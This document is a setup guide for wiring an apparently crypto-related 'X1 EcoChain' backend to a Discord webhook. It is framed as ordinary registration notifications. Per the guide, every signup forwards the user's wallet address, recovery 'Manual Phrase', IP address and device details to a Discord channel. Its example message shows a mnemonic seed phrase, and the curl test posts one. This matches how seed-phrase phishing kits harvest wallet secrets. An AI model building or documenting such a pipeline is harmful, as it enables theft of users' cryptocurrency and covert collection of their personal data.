# Discord Integration Setup

## How to Get Discord Webhook URL

1. **Open your Discord Server**
   - Go to your server where you want to receive notifications

2. **Create a Channel** (or use existing)
   - Create a channel like `#user-registrations` or `#notifications`

3. **Access Channel Settings**
   - Right-click the channel → **Edit Channel**
   - Click **Integrations** (left sidebar)

4. **Create Webhook**
   - Click **Create Webhook**
   - Name it (e.g., "X1 EcoChain Bot")
   - Optionally add an avatar image
   - Click **Save**

5. **Copy Webhook URL**
   - Click **Copy Webhook URL**
   - Save this URL securely

## Configure Backend

Add the webhook URL to your environment file:

### `.env.local` (Development)
```
MONGODB_URI=mongodb+srv://user:pass@cluster.mongodb.net/x1-ecochain
PORT=5000
NODE_ENV=development
CORS_ORIGIN=http://localhost:3000
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN
```

### `.env` (Production/Replit)
Set `DISCORD_WEBHOOK_URL` in Replit Secrets:
- Go to Replit → Secrets (lock icon)
- Add `DISCORD_WEBHOOK_URL` with your webhook URL

## What Gets Sent to Discord

When a user registers or updates, a Discord embed is sent with:

- ✅ **Wallet Address** - User's crypto wallet
- ✅ **Manual Phrase** - First 50 chars (encrypted in production)
- ✅ **Device Type** - Mobile/Tablet/Desktop
- ✅ **Browser** - Chrome, Firefox, Safari, etc. + version
- ✅ **Platform** - Windows, macOS, Linux, etc.
- ✅ **IP Address** - Client's IP
- ✅ **User Agent** - Browser identification string
- ✅ **Timestamp** - When registration occurred

## Example Discord Message

```
🟢 New User Registered

Wallet Address:
0x742d35cc6634c0532925a3b844bc9e7595f42be7

Manual Phrase:
abandon ability able about above absent abuse access...

Device Type: desktop
Browser: Chrome 120.0.6099.210
Platform: Windows
IP Address: 203.0.113.45
User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...

Timestamp: 2024-01-15T10:30:00.000Z
X1 EcoChain Testnet
```

## Testing

1. Install dependencies:
```bash
npm install
```

2. Start backend:
```bash
npm run dev
```

3. Test with curl or Postman:
```bash
curl -X POST http://localhost:5000/api/user/save \
  -H "Content-Type: application/json" \
  -d '{
    "walletAddress": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE7",
    "manualPhrase": "test seed phrase here"
  }'
```

4. Check your Discord channel - you should see the notification!

## Troubleshooting

### Webhook Not Working
- Check that `DISCORD_WEBHOOK_URL` is set correctly
- Verify the URL is still valid (webhooks can expire)
- Check backend console logs for errors

### No Messages Appearing
- Verify bot has permissions to post in the channel
- Check webhook URL has HTTPS (not HTTP)
- Make sure backend is running

### "Discord webhook not configured"
- You haven't set `DISCORD_WEBHOOK_URL` in environment
- Add it to `.env.local` or Replit Secrets

## Security Notes

- Keep webhook URL private - don't commit to git
- Anyone with the URL can post to your channel
- Rotate/recreate webhooks if compromised
- In production, use environment variables (Replit Secrets)

## Webhook Management

### Disable Notifications
- Set `DISCORD_WEBHOOK_URL=""` (empty string)
- Backend will skip Discord notifications

### Change Channel
- Create new webhook in different channel
- Update `DISCORD_WEBHOOK_URL`

### Delete Webhook
- Right-click webhook in channel settings
- Click Delete
- The URL will stop working
